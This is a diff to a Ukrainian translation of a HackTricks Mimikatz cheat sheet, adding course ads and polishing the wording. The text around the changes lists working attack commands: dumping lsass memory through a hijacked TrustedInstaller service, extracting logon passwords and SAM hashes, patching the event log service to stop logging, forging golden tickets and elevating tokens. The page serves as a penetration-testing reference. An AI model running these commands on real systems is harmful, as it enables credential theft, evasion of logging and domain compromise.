@@ -15,6 +15,13 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 </details>
 {% endhint %}
 
+<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+Deepen your expertise in **Mobile Security** with 8kSec Academy. Master iOS and Android security through our self-paced courses and get certified:
+
+{% embed url="https://academy.8ksec.io/" %}
+
+
 **Ця сторінка базується на одній з [adsecurity.org](https://adsecurity.org/?page\_id=1821)**. Перевірте оригінал для отримання додаткової інформації!
 
 ## LM та відкритий текст в пам'яті
@@ -27,7 +34,7 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 1. Модифікацію реєстру в _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_, встановивши `RunAsPPL` на `dword:00000001`.
 2. Впровадження об'єкта групової політики (GPO), який забезпечує цю зміну реєстру на керованих пристроях.
 
-Незважаючи на ці заходи, інструменти, такі як Mimikatz, можуть обійти захист LSA, використовуючи специфічні драйвери, хоча такі дії, ймовірно, будуть зафіксовані в журналах подій.
+Незважаючи на ці заходи, такі інструменти, як Mimikatz, можуть обійти захист LSA, використовуючи специфічні драйвери, хоча такі дії, ймовірно, будуть зафіксовані в журналах подій.
 
 ### Протидія видаленню SeDebugPrivilege
 
@@ -36,7 +43,7 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
 sc start TrustedInstaller
 ```
-Це дозволяє скинути пам'ять `lsass.exe` у файл, який потім можна проаналізувати на іншій системі для витягнення облікових даних:
+Це дозволяє вивантажити пам'ять `lsass.exe` у файл, який потім можна проаналізувати на іншій системі для витягнення облікових даних:
 ```
 # privilege::debug
 # sekurlsa::minidump lsass.dmp
@@ -54,7 +61,7 @@ sc start TrustedInstaller
 #### Experimental Feature: Patching the Event Service
 
 - **Command**: `event::drop`
-- Ця експериментальна команда призначена для зміни поведінки служби реєстрації подій, ефективно запобігаючи її реєстрації нових подій.
+- Ця експериментальна команда призначена для зміни поведінки служби реєстрації подій, ефективно запобігаючи їй реєструвати нові події.
 - Example: `mimikatz "privilege::debug" "event::drop" exit`
 
 - Команда `privilege::debug` забезпечує, щоб Mimikatz працював з необхідними привілеями для зміни системних служб.
@@ -65,15 +72,15 @@ sc start TrustedInstaller
 
 ### Golden Ticket Creation
 
-Золотий квиток дозволяє для доступу на рівні домену шляхом імперсонації. Ключова команда та параметри:
+Золотий квиток дозволяє для доступу до домену під виглядом іншого користувача. Ключова команда та параметри:
 
 - Command: `kerberos::golden`
 - Parameters:
 - `/domain`: Ім'я домену.
 - `/sid`: Ідентифікатор безпеки (SID) домену.
-- `/user`: Ім'я користувача для імперсонації.
+- `/user`: Ім'я користувача, під виглядом якого потрібно діяти.
 - `/krbtgt`: NTLM хеш облікового запису служби KDC домену.
-- `/ptt`: Безпосередньо інжектує квиток у пам'ять.
+- `/ptt`: Безпосередньо впроваджує квиток у пам'ять.
 - `/ticket`: Зберігає квиток для подальшого використання.
 
 Example:
@@ -122,7 +129,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - Дозволяє використовувати квиток Kerberos в іншій сесії.
 - Приклад: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`
 
-- **Очистити квитки**:
+- **Очищення квитків**:
 - Команда: `kerberos::purge`
 - Очищає всі квитки Kerberos з сесії.
 - Корисно перед використанням команд маніпуляції квитками, щоб уникнути конфліктів.
@@ -142,7 +149,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - `mimikatz "lsadump::lsa /inject" exit`
 
 - **LSADUMP::NetSync**: Імітувати DC, використовуючи дані пароля облікового запису комп'ютера.
-- *Специфічна команда для NetSync в оригінальному контексті не надана.*
+- *У оригінальному контексті не надано конкретної команди для NetSync.*
 
 - **LSADUMP::SAM**: Доступ до локальної бази даних SAM.
 - `mimikatz "lsadump::sam" exit`
@@ -163,7 +170,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 
 ### Підвищення привілеїв
 
-- **PRIVILEGE::Backup**: Отримати права резервного копіювання.
+- **PRIVILEGE::Backup**: Отримати права на резервне копіювання.
 - `mimikatz "privilege::backup" exit`
 
 - **PRIVILEGE::Debug**: Отримати привілеї налагодження.
@@ -171,7 +178,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 
 ### Витягування облікових даних
 
-- **SEKURLSA::LogonPasswords**: Показати облікові дані для увійшли користувачів.
+- **SEKURLSA::LogonPasswords**: Показати облікові дані для користувачів, які увійшли в систему.
 - `mimikatz "sekurlsa::logonpasswords" exit`
 
 - **SEKURLSA::Tickets**: Витягти квитки Kerberos з пам'яті.
@@ -181,18 +188,18 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 
 - **SID::add/modify**: Змінити SID та SIDHistory.
 - Додати: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
-- Змінити: *Специфічна команда для зміни в оригінальному контексті не надана.*
+- Змінити: *У оригінальному контексті не надано конкретної команди для зміни.*
 
 - **TOKEN::Elevate**: Імітувати токени.
 - `mimikatz "token::elevate /domainadmin" exit`
 
-### Служби терміналів
+### Терминальні служби
 
 - **TS::MultiRDP**: Дозволити кілька RDP сесій.
 - `mimikatz "ts::multirdp" exit`
 
 - **TS::Sessions**: Перерахувати сесії TS/RDP.
-- *Специфічна команда для TS::Sessions в оригінальному контексті не надана.*
+- *У оригінальному контексті не надано конкретної команди для TS::Sessions.*
 
 ### Сховище
 
@@ -200,17 +207,23 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - `mimikatz "vault::cred /patch" exit`
 
 
+<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+Поглибте свої знання в **Мобільній безпеці** з 8kSec Academy. Опануйте безпеку iOS та Android через наші курси з самостійним навчанням та отримайте сертифікат:
+
+{% embed url="https://academy.8ksec.io/" %}
+
 {% hint style="success" %}
-Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Вчіться та практикуйте Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Вчіться та практикуйте Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Support HackTricks</summary>
+<summary>Підтримка HackTricks</summary>
 
-* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
+* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Діліться хакерськими трюками, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на GitHub.
 
 </details>
 {% endhint %}
